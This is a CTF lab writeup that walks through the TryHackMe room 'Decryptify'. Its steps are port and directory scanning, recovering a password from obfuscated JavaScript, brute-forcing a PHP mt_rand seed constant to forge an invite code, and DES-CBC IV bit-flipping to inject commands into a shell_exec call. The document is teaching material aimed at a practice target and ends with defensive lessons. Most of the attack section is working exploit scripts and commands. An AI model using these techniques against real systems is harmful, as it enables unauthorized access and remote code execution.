# TryHackMe: Decryptify — Human Walkthrough & Writeup

**Room Link:** [TryHackMe - Decryptify](https://tryhackme.com/room/decryptify)  
**Target IP:** `10.49.146.255`  
**Difficulty:** Medium  
**Author / Player:** Human CTF Player Walkthrough  

---

## Introduction & Initial Impressions

Decryptify is a classic web-and-cryptography CTF room that tests your ability to spot weak implementations of randomness and symmetric encryption. Rather than standard automated exploitation, this box requires understanding what happens under the hood:
1. Reversing client-side JS obfuscation to unlock an internal API endpoint.
2. Cracking a seeded PHP Mersenne Twister PRNG using leaked log artifacts.
3. Forging a valid invite code to access the authenticated member dashboard.
4. Exploiting DES-CBC bit-flipping on a hidden parameter passed to `shell_exec()` to disclose server-side source code.
5. Recovering the hardcoded key and cleanly forging encrypted commands to pop the final root/user flag.

Here is the exact step-by-step journey of how I solved it.

---

## 1. Reconnaissance: Port Scanning

I always start with a full port scan to see what network services are listening.

```bash
nmap -sV -sC -T4 10.49.146.255 -p- --open -oN nmap_allports.log
```

### Scan Results:
```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login - Decryptify
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|       httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Only two ports are accessible:
- **Port 22 (SSH):** Standard OpenSSH 8.2p1. Unlikely to have anonymous vulnerabilities.
- **Port 1337 (HTTP):** Apache 2.4.41 running a PHP web application titled *"Login - Decryptify"*.

Everything points straight to port 1337.

---

## 2. Web Enumeration: The Login Portal & API

Browsing to `http://10.49.146.255:1337/`, I was greeted with a Bootstrap login page with two panels:
- A standard **Login** form (requiring a username and password/code).
- A **Login with Invite Code** form (requiring an email/username and an invite code).

Looking at the page source (`Ctrl+U`), the footer immediately caught my eye:

```html
<footer class="bg-light text-center py-3">
    <p>&copy; 2026 Decryptify</p>
    <p><a href="api.php">API Documentation</a></p>
</footer>
<script src="/js/bootstrap.bundle.min.js"></script>
<script src="/js/api.js"></script>
```

Two interesting things:
1. A link to `api.php`.
2. A custom JavaScript file loaded from `/js/api.js`.

### Checking `api.php`
When I clicked through to `http://10.49.146.255:1337/api.php`, the page was locked behind a password prompt:
*"Enter API Password"*.

---

## 3. Deobfuscating `/js/api.js`

Naturally, my next thought was: *Is the password hardcoded or validated client-side?*

I pulled `/js/api.js` with `curl`:
```bash
curl -s http://10.49.146.255:1337/js/api.js
```

The script was obfuscated using a standard `javascript-obfuscator` string array rotation technique:

```javascript
function b(c,d){const e=a();return b=function(f,g){f=f-0x165;let h=e[f];return h;},b(c,d);}const j=b;function a(){const k=['16OTYqOr','861cPVRNJ','474AnPRwy','H7gY2tJ9wQzD4rS1','5228dijopu','29131EDUYqd','8756315tjjUKB','1232020YOKSiQ','7042671GTNtXE','1593688UqvBWv','90209ggCpyY'];a=function(){return k;};return a();}(function(d,e){const i=b,f=d();while(!![]){try{const g=parseInt(i(0x16b))/0x1+-parseInt(i(0x16f))/0x2+parseInt(i(0x167))/0x3*(parseInt(i(0x16a))/0x4)+parseInt(i(0x16c))/0x5+parseInt(i(0x168))/0x6*(parseInt(i(0x165))/0x7)+-parseInt(i(0x166))/0x8*(parseInt(i(0x16e))/0x9)+parseInt(i(0x16d))/0xa;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0xe43f0));const c=j(0x169);
```

Instead of manually tracing the array shifting loop, I ran it directly in Node.js on my local terminal and printed the value of `j(0x169)`:

```bash
node -e '
function b(c,d){const e=a();return b=function(f,g){f=f-0x165;let h=e[f];return h;},b(c,d);}const j=b;function a(){const k=["16OTYqOr","861cPVRNJ","474AnPRwy","H7gY2tJ9wQzD4rS1","5228dijopu","29131EDUYqd","8756315tjjUKB","1232020YOKSiQ","7042671GTNtXE","1593688UqvBWv","90209ggCpyY"];a=function(){return k;};return a();}(function(d,e){const i=b,f=d();while(!![]){try{const g=parseInt(i(0x16b))/0x1+-parseInt(i(0x16f))/0x2+parseInt(i(0x167))/0x3*(parseInt(i(0x16a))/0x4)+parseInt(i(0x16c))/0x5+parseInt(i(0x168))/0x6*(parseInt(i(0x165))/0x7)+-parseInt(i(0x166))/0x8*(parseInt(i(0x16e))/0x9)+parseInt(i(0x16d))/0xa;if(g===e)break;else f["push"](f["shift"]());}catch(h){f["push"](f["shift"]());}}}(a,0xe43f0));
console.log("Decoded Password:", j(0x169));
'
```

Output:
```text
Decoded Password: H7gY2tJ9wQzD4rS1
```

Just like that, I had the API password: **`H7gY2tJ9wQzD4rS1`**.

---

## 4. Inspecting the API Documentation & PRNG Logic

I submitted `H7gY2tJ9wQzD4rS1` to `api.php`:

```bash
curl -s -X POST -d "api_password=H7gY2tJ9wQzD4rS1" http://10.49.146.255:1337/api.php
```

The page rendered an internal developer documentation screen containing the snippet responsible for generating user invite codes:

```php
// Token generation algorithm
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);
```

### Analyzing the Algorithm:
This was a huge finding:
- The token is simply `mt_rand()` base64-encoded.
- PHP seeds the Mersenne Twister using `mt_srand($seed_value)`.
- The seed formula is deterministic:
  $$\text{seed} = \text{hexdec}(\text{strlen}(email) + constant\_value + \text{hexdec}(\text{substr}(email, 0, 8)))$$
- Everything is known **except** `$constant_value` and an active email address. If I could find a single leaked email and invite code pair, I could easily brute-force `$constant_value`.

---

## 5. Directory Fuzzing & Finding Leaked Logs

While analyzing the math, I started a directory scan in the background:

```bash
ffuf -u "http://10.49.146.255:1337/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -mc 200,301,302
```

It quickly returned:
```text
logs                    [Status: 301, Size: 320, Words: 20, Lines: 10]
```

Visiting `http://10.49.146.255:1337/logs/` showed Apache directory listing was enabled, revealing a single file: `app.log`.

```bash
curl -s http://10.49.146.255:1337/logs/app.log
```

### Log File Contents:
```text
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

Look at that:
1. `alpha@fake.thm` had an invite code generated: `MTM0ODMzNzEyMg==`.
   ```bash
   echo "MTM0ODMzNzEyMg==" | base64 -d
   # Result: 1348337122
   ```
2. `alpha@fake.thm` was deactivated, but a new active user was created: **`hello@fake.thm`**.

---

## 6. Cracking the Seed Constant & Capturing Flag 1

Now we have a complete known-plaintext pair:
- Email: `alpha@fake.thm`
- Target `mt_rand()` value: `1348337122`

I wrote a short PHP one-liner to loop through possible values of `$constant_value`:

```bash
php -r '
$email = "alpha@fake.thm";
$email_length = strlen($email);
$email_hex = hexdec(substr($email, 0, 8));
$target = 1348337122;

for ($c = 0; $c <= 1000000; $c++) {
    $sum = $email_length + $c + $email_hex;
    $seed = hexdec($sum);
    mt_srand($seed);
    if (mt_rand() === $target) {
        echo "[+] Found constant_value: $c\n";
        exit(0);
    }
}
'
```

In a fraction of a second, the output arrived:
```text
[+] Found constant_value: 99999
```

With `$constant_value = 99999` in hand, I generated the invite code for `hello@fake.thm`:

```bash
php -r '
$constant_value = 99999;
$email = "hello@fake.thm";
$email_length = strlen($email);
$email_hex = hexdec(substr($email, 0, 8));
$seed_value = hexdec($email_length + $constant_value + $email_hex);

mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);

echo "[+] Target Email: $email\n";
echo "[+] Generated Code: $invite_code\n";
'
```

Output:
```text
[+] Target Email: hello@fake.thm
[+] Generated Code: NDYxNTg5ODkx
```

### Logging Into the Dashboard
I sent the POST request to `index.php` using `curl` and stored the session cookies in `session.txt`:

```bash
curl -i -s -X POST \
  -d "invite_username=hello@fake.thm&invite_code=NDYxNTg5ODkx" \
  -c session.txt -b session.txt \
  http://10.49.146.255:1337/index.php
```

The server responded with `302 Found` redirecting to `dashboard.php`. When I loaded `dashboard.php`:

```bash
curl -s -b session.txt http://10.49.146.255:1337/dashboard.php
```

Right there in the main header:
```html
<main class="container my-5">
    <h2>Welcome, hello@fake.thm! - Flag: THM{CryptographyPwn007}</h2>
    ...
</main>
```

**Flag 1:** `THM{CryptographyPwn007}`

---

## 7. Discovering the RCE Vector (The `date` Parameter)

Now for Flag 2. The question asks for the contents of `/home/ubuntu/flag.txt`, which means we need Remote Code Execution.

Looking closer at `dashboard.php`, the footer contains:
```html
<footer class="bg-light text-center py-3">
    <p>&copy;  <strong>2026
</strong> Decryptify</p>
    <form method="get">
        <input type="hidden" name="date" value="5JzrJqvV30v07vtN7tvXO+rTFcTmGvQkU/BX3D4ZKUU=">
    </form>
</footer>
```

Observations:
- The year `2026\n` inside `<strong>` is generated dynamically.
- There is a hidden GET parameter named `date` carrying a base64 ciphertext: `5JzrJqvV30v07vtN7tvXO+rTFcTmGvQkU/BX3D4ZKUU=`.
- If I tested altering any random byte in `date`, the backend returned:
  ```text
  Padding error: error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt
  ```
  This is a classic OpenSSL decryption padding error!

---

## 8. Cryptographic Exploitation: DES-CBC Bit-Flipping

Decoding the ciphertext:
```bash
echo "5JzrJqvV30v07vtN7tvXO+rTFcTmGvQkU/BX3D4ZKUU=" | base64 -d | wc -c
# Output: 32 bytes
```

32 bytes in CBC mode usually means:
- If block size is 8 bytes (e.g. DES or Blowfish): 1 IV block (8 bytes) + 3 ciphertext blocks (24 bytes) = 32 bytes.
- Or if block size is 16 bytes (AES): 1 IV block (16 bytes) + 1 ciphertext block (16 bytes) = 32 bytes.

In CBC mode, the first block of plaintext is decrypted by:
$$P_1 = D_K(C_1) \oplus IV$$

Because the decrypted string produces the year `2026\n`, the underlying command being executed on the system is almost certainly:
```text
date +%Y
```
(8 bytes long!).

If the system takes the decrypted plaintext and passes it into a system execution wrapper like `shell_exec($plaintext)`:
1. `P_1` is 8 bytes (`date +%Y`).
2. If we flip bits in the IV ($IV_0 \dots IV_7$), the corresponding bytes in $P_1$ flip identically!
3. Because padding is only validated on the *last* block, altering the IV will **not** trigger a padding error!

### Testing Arbitrary Command Execution
Can we fit a command into the first 8 bytes?
`cat d* #` is exactly 8 bytes!
- `cat d*` reads `dashboard.php`.
- `#` comments out the subsequent blocks, so any garbled trailing plaintext is completely ignored by bash!

I wrote a Python script to perform the bit-flip:

```python
import urllib.request, urllib.parse, base64

cookies = open("session.txt").read()
# Extract PHPSESSID and role cookies for the request
cookie_header = "PHPSESSID=...; role=..." # from session.txt

orig = bytearray(base64.b64decode("5JzrJqvV30v07vtN7tvXO+rTFcTmGvQkU/BX3D4ZKUU="))

p_known  = b"date +%Y"
p_target = b"cat d* #"

# Flip the first 8 bytes of the IV
for i in range(8):
    orig[i] ^= (p_known[i] ^ p_target[i])

new_b64 = base64.b64encode(orig).decode()
url = f"http://10.49.146.255:1337/dashboard.php?date={urllib.parse.quote(new_b64)}"

req = urllib.request.Request(url, headers={"Cookie": cookie_header})
res = urllib.request.urlopen(req).read().decode()

print(res)
```

Running this script returned the complete source code of `dashboard.php` rendered inside the `<strong>` tag!

---

## 9. Reading `dashboard.php` Source & Uncovering the Key

Looking at the extracted PHP code from `dashboard.php`:

```php
<?php
session_start();
include('db.php');

$pass = 'tryhack1'; // <--- HARDCODED PASSPHRASE!

function pad($text, $blocksize) {
    $pad = $blocksize - (strlen($text) % $blocksize);
    return $text . str_repeat(chr($pad), $pad);
}

function encryptString($unencryptedText, $passphrase) {
    $iv = random_bytes(openssl_cipher_iv_length('DES-CBC'));
    $text = pad($unencryptedText, 8);
    $enc = openssl_encrypt($text, 'DES-CBC', $passphrase, OPENSSL_RAW_DATA, $iv); 
    return base64_encode($iv . $enc);
}

function decryptString($encryptedText, $passphrase) {
    $encrypted = base64_decode($encryptedText); 
    $iv_size = openssl_cipher_iv_length('DES-CBC');
    $iv = substr($encrypted, 0, $iv_size);
    $ciphertext = substr($encrypted, $iv_size);
    $dec = openssl_decrypt($ciphertext, 'DES-CBC', $passphrase, OPENSSL_RAW_DATA, $iv);
    return $dec;
}

if (isset($_GET['date'])) {
    $resp = decryptString($_GET['date'], $pass);
    if (strpos($resp, 'Padding error:') !== false) {
        $output = $resp;
    } else {
        $output = shell_exec($resp);
    }
}
?>
```

### The Vulnerability:
1. The cipher is **`DES-CBC`**.
2. The key is hardcoded: **`tryhack1`**.
3. It directly calls `shell_exec($resp)` with no sanitization or command restriction!

---

## 10. Forging the Exploit & Capturing Flag 2

Now that we have the exact passphrase (`tryhack1`), we don't even need to bit-flip anymore. We can encrypt any arbitrary command using PHP's `openssl_encrypt()`!

I crafted a command to read `/home/ubuntu/flag.txt`:

```bash
php -r '
$pass = "tryhack1";
$cmd = "cat /home/ubuntu/flag.txt";

$iv = random_bytes(openssl_cipher_iv_length("DES-CBC"));
$pad = 8 - (strlen($cmd) % 8);
$padded = $cmd . str_repeat(chr($pad), $pad);
$enc = openssl_encrypt($padded, "DES-CBC", $pass, OPENSSL_RAW_DATA, $iv);
$payload = base64_encode($iv . $enc);

echo "Payload: " . $payload . "\n";
'
```

Output:
```text
Payload: Wdw8zluwuVHBpQ8IBix8GlRyMlR/uHL2Iv5KGdenezMkpy888n1qjXQknS9Hz5E5
```

I passed this payload via `curl` to `dashboard.php`:

```bash
curl -s -b session.txt "http://10.49.146.255:1337/dashboard.php?date=Wdw8zluwuVHBpQ8IBix8GlRyMlR%2FuHL2Iv5KGdenezMkpy888n1qjXQknS9Hz5E5" | grep -A 2 "<strong>"
```

The server executed the command and rendered the flag in the response:

```html
<strong>THM{GOT_COMMAND_EXECUTION001}
</strong>
```

**Flag 2:** `THM{GOT_COMMAND_EXECUTION001}`

---

## Summary of Answers

| Question | Answer |
|---|---|
| **What is the flag value after logging into the panel?** | `THM{CryptographyPwn007}` |
| **What is the content of the /home/ubuntu/flag.txt file?** | `THM{GOT_COMMAND_EXECUTION001}` |

---

## Lessons Learned & Key Takeaways

1. **Obfuscation $\neq$ Encryption:** Never store secrets or validation tokens inside client-side JavaScript.
2. **CSPRNG vs PRNG:** `mt_rand()` is not cryptographically secure and must never be used for security tokens or invite codes. Always use `random_bytes()` or `bin2hex(random_bytes(32))`.
3. **Avoid Deprecated Ciphers (DES):** DES has a 56-bit key and 8-byte blocks, vulnerable to collision attacks and bit-flipping if integrity (HMAC or AEAD like AES-GCM) is absent.
4. **Command Injection via Decryption:** Passing decrypted strings directly to `shell_exec()` turns any cryptographic manipulation into critical Remote Code Execution.
